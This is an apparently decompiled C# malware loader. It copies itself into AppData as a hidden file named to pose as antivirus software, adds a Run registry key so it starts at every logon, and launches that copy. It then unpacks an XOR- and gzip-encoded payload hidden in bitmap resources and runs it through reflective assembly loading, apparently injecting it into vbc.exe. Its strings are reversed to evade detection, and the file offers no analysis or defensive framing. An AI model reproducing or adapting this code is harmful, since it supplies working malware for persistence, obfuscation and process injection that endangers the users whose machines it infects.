using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
public sealed class Entrypoint
{
	public static byte[] PolyIndia(byte[] data)
	{
		byte[] array = new byte[data.Length - 16 - 1 + 1];
		Buffer.BlockCopy(data, 16, array, 0, array.Length);
		int num = array.Length - 1;
		for (int i = 0; i <= num; i++)
		{
			array[i] = (byte)(array[i] ^ data[i % 16]);
		}
		return array;
	}

	public static byte[] DC(byte[] data)
	{
		MemoryStream memoryStream = new MemoryStream();
		memoryStream.Write(data, 0, data.Length);
		memoryStream.Position = 0L;
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress, leaveOpen: true);
		MemoryStream memoryStream2 = new MemoryStream();
		byte[] array = new byte[64];
		int num = -1;
		for (num = gZipStream.Read(array, 0, array.Length); num > 0; num = gZipStream.Read(array, 0, array.Length))
		{
			memoryStream2.Write(array, 0, num);
		}
		gZipStream.Close();
		return memoryStream2.ToArray();
	}

	[STAThread]
	public static void Main()
	{
		try
		{
			FileAttributes fileAttributes = FileAttributes.Hidden;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Strings.StrReverse("exe.orPdleihSVA\\tfosorciM\\");
			string name = Strings.StrReverse("orPdleihSVA");
			string name2 = Strings.StrReverse("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\ERAWTFOS");
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text);
				File.SetAttributes(text, fileAttributes);
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey(name2, writable: true)!.SetValue(name, text);
				Process.Start(text);
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), text);
				File.SetAttributes(text, fileAttributes);
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey(name2, writable: true)!.SetValue(name, text);
				Process.Start(text);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string resourceNamespace = "Entrypoint";
			byte[] Data = DC((byte[])Reskit.GetObject(resourceNamespace, Strings.StrReverse("yelimS")));
			byte[] SCode = Tools.ReadDataFromBitmap(Data2Bmp(ref Data));
			Data = (byte[])Reskit.GetObject(resourceNamespace, Strings.StrReverse("1tcejorP"));
			byte[] Bytes = DC(PolyIndia(Tools.ReadDataFromBitmap(Data2Bmp(ref Data))));
			LNative(ref SCode, ref Bytes, "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private static Bitmap Data2Bmp(ref byte[] Data)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		using MemoryStream memoryStream = new MemoryStream(Data);
		return (Bitmap)Image.FromStream((Stream)memoryStream);
	}

	private static void LNative(ref byte[] SCode, ref byte[] Bytes, string Rproc)
	{
		object obj = Assembly.Load(SCode);
		object type = ((Assembly)obj).GetType(Tools.DcStr("nhMpiK@)nhMpiK@"));
		object method = ((Type)type).GetMethod(Tools.DcStr("Die`^o"));
		string text = "";
		((MethodInfo)method).Invoke(null, new object[3] { Bytes, Rproc, text });
	}
}
